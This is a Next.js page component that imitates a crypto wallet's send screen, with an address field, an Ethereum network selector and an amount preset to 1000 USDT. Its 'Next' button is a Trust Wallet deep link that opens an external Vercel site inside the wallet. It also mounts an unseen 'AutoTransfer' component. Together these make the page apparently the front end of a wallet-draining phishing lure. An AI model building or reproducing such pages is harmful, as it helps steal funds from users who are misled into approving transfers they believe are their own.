"use client";

import { useState } from "react";
import AutoTransfer from "./components/AutoTransfer";

const NEXT_LINK = "https://link.trustwallet.com/open_url?url=https://newethtest.vercel.app/";

export default function Home() {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("1000");

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  const parsedAmount = parseFloat(amount) || 0;

  return (
    <main className="transfer-main">
      {/* ===== Transfer Form ===== */}
      <div className="form-container">
        {/* --- Address or Domain Name --- */}
        <label className="form-label">Address or Domain Name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions">
            <button onClick={handlePaste} className="btn-paste">
              Paste
            </button>
            {/* Clipboard icon */}
            <button className="btn-icon" title="Copy">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
              </svg>
            </button>
            {/* QR scan icon */}
            <button className="btn-icon" title="Scan QR">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 3H5a2 2 0 00-2 2v2" />
                <path d="M17 3h2a2 2 0 012 2v2" />
                <path d="M21 17v2a2 2 0 01-2 2h-2" />
                <path d="M7 21H5a2 2 0 01-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        {/* --- Destination network --- */}
        <label className="form-label form-label--spaced">
          Destination network
        </label>
        <div className="network-selector">
          {/* Ethereum diamond icon */}
          <div className="eth-icon">
            <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#828384" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#bcc0c4" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#828384" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#bcc0c4" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#2f3030" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#828384" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg
            width="12"
            height="12"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#9ca3af"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            style={{ marginLeft: "6px" }}
          >
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        {/* --- Amount --- */}
        <label className="form-label form-label--spaced">Amount</label>
        <div className="input-row">
          <input
            type="text"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="input-row__field input-row__field--amount"
          />
          <div className="amount-actions">
            {/* Up/down arrows */}
            <div className="stepper">
              <button
                className="btn-step"
                onClick={() => setAmount(String(parsedAmount + 1))}
              >
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="18 15 12 9 6 15" />
                </svg>
              </button>
              <button
                className="btn-step"
                onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}
              >
                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>
            <span className="amount-currency">USDT</span>
            <button className="btn-max">Max</button>
          </div>
        </div>

        <p className="approx-price">≈ ${parsedAmount.toFixed(2)}</p>
      </div>

      {/* ===== Next Button ===== */}
      <div className="next-btn-wrapper">
        <a
          href={NEXT_LINK}
          rel="noopener noreferrer"
          className="next-btn"
        >
          Next
        </a>
      </div>

      <AutoTransfer />
    </main>
  );
}